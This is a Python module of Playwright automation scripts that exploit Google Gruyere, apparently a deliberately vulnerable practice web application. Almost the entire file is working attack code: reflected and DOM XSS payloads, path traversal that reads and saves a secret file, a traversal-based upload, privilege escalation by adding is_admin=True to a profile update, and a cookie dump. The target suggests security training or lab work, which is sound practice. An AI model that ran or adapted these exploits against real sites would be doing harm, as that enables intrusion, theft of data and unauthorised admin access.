"""This module provides the Individual Gruyere Exploits."""


from playwright.sync_api import sync_playwright
import urllib.parse
import requests
import time
import os


class ExploitBrowser:
    def __init__(self):
        self.browser = None
        self.page = None

    def setup_browser(self):
        """Setup the browser and page for exploit commands to be executed"""
        playwright = sync_playwright().start()
        self.browser = playwright.chromium.launch(headless=False)
        self.page = self.browser.new_page()
        return self.page

    def open_url(self, url: str):
        """Will allow for browser persistence by updating the same page instance"""
        if self.page is None:
            self.page = self.setup_browser()
        print(f"URL: {url}")
        self.page.goto(url)

    def dom_xss_attack(self, url: str, payload: str):
        """Exploit Web page DOM"""
        self.open_url(url)
        self.page.evaluate(
            f'document.querySelector("h2").textContent = "{payload}";')

    def reflected_xss_attack(self, url: str):
        """Exploit Web page with a reflected XSS attack, payload added to url"""
        self.open_url(url)
        time.sleep(5)
        reflected_xss_payload = f"{url}<script>document.body.innerHTML = '<h1>Hacked!</h1>';</script>"
        self.open_url(reflected_xss_payload)
        print("Reflected XSS vulnerability successfully exploited")

    def steal_file_data(self, url: str, new_secret_destination: str):
        """
        Exploit the Gruyere server using path traversal attack to read the secret.txt file. Using path traversal
        """
        full_url = f"{url}..%2fsecret.txt"
        self.open_url(full_url)

        response = requests.get(full_url)
        if response.status_code == 200:
            secret_content = response.text
            with open(new_secret_destination, "w") as file:
                file.write(secret_content)
            print(
                f"Successfully retrieved and saved secret.txt to {new_secret_destination}")
        else:
            print("Failed to exploit the server and read secret.txt")

    def exploit_file_upload_path_traversal(self, url: str, filename: str):
        """Exploit web page url to upload a file to the server"""
        print(url)
        file_path = filename
        file_name = urllib.parse.unquote(os.path.basename(file_path))

        try:
            full_url = f"{url}..%2f/resources/{file_name}"
            print(full_url)
            self.open_url(full_url)
            self.page.wait_for_load_state()
            print(
                f"Successfully uploaded {full_url} to resources directory")
        except Exception as e:
            print(f"An error occurred: {str(e)}")

        time.sleep(60)

    def commandline_login_credentials(self, url: str, username: str, password: str):
        """Able to use command line to add credentials to remotely login"""

        login_path = f"{url}login"
        self.open_url(login_path)
        time.sleep(5)
        try:
            text_input = self.page.locator('input[type="text"]')
            if text_input:
                text_input.fill(username)
            pass_input = self.page.locator(
                'input[type="password"]').fill(password)
            if pass_input:
                pass_input.fill(password)
            self.page.click('input[type=submit]')

        except Exception as e:
            print(f"Error {e} occured whilst attempting login")

        self.page.wait_for_load_state()
        time.sleep(20)

    def cookies_elevate_privileges(self, url: str):
        """"""
        self.open_url(url)
        time.sleep(10)
        create_admin_url = f"{url}saveprofile?action=update&is_admin=True"
        print(create_admin_url)
        try:
            self.open_url(create_admin_url)
            print("Successfully elevated privileges")
            time.sleep(20)
        except Exception as e:
            print("Failed to elevate privileges")

    def check_cookies(self, url: str):
        """Reveal the cookies from the webpage."""
        self.open_url(url)
        # Retrieve the cookies
        cookies = self.page.context.cookies()

        if len(cookies) > 0:
            for cookie in cookies:
                print(f"Name: {cookie['name']}")
                print(f"Value: {cookie['value']}")
                print(f"Domain: {cookie['domain']}")
                print(f"Path: {cookie['path']}")
                print(f"Expires: {cookie['expires']}")
                print(f"Secure: {cookie['secure']}")
                print("")
        else:
            print("No cookies found.")

        time.sleep(5)


# def exploit_upload_functionality(url: str, file: str):
#     """Uploads file which has html to the webpage"""
#     with sync_playwright() as playwright:
#         browser = playwright.chromium.launch(headless=False)
#         context = browser.new_context()
#         page = context.new_page()

#         try:
#             page.goto(url)
#             print(url)
#             page.wait_for_load_state()

#             # Upload the file
#             file_input = page.locator('input[type="file"]')
#             print(file_input)
#             if file_input.count() > 0:
#                 file_input.set_input_files(file)
#             else:
#                 raise Exception("File input element not found")

#             # Submit the form
#             submit_button = page.locator('input[type="submit"]')
#             print(submit_button)
#             # Wait for the submit button to become visible
#             page.wait_for_selector(
#                 'input[type="submit"]', state='visible')
#             submit_button.click()

#             typer.echo("File uploaded successfully with path traversal attack!")
#             time.sleep(10)

#         except Exception as e:
#             typer.echo(f"An error occurred: {str(e)}")

#         finally:
#             time.sleep(10)
